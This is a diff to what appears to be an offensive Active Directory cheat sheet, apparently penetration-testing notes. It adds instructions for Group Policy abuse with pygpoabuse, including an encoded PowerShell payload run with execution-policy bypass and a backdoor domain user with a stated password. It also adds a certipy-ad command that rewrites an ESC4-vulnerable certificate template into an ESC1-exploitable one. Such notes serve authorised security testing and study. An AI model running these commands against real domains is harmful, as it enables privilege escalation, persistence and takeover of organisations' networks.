@@ -306,7 +306,10 @@ set-domainuserpassword $target_user -accountpassword $cred
 [[GPO]]
 === GPO abuse
 
-If user have *GenericAll* of other google it over *Default Domain Policy* and *Default Domain Contraoller Policy* , great tool for exploatation this is python script `pygpoabuse` usage:
+If user have *GenericAll* of other google it over *Default Domain Policy* and *Default Domain Contraoller Policy* , great tool for exploatation this is python script `pygpoabuse` .This script will add a user to AD with creds:
+`john`  :  `H4x00r123..` 
+
+usage:
 
 ```bash
 python3 pygpoabuse.py domain/user:'pass' -command "powershell -exec bypass -enc JABjAGwAaQBlAG4AdAAgA...<SNIP>...AGwAbwBzAGUAKAApAA==" -dc-ip 10.10.10.10 -gpo-id "00000000-016D-11D2-945F-00C04FB984F9"
@@ -396,6 +399,14 @@ certipy-ad auth -pfx 'user.pfx' -dc-ip domain_ip
 Returns a `hash` of target user
 
 It was example for `ESC1` vulnerable template
+
+*ESC4* template vulnerability can be exploit by the same way.User have a dangerous privileges over templates
+
+```bash
+certipy-ad template -u 'user@domain' -p 'pass' -template template_name -dc-ip 10.10.10.10 -write-default-configuration 
+```
+
+This step is used after `find` to make a template vulnerable to *ESC1* by exploiting dangerous privileges
 
 [[rm]]
 == Remote Managment
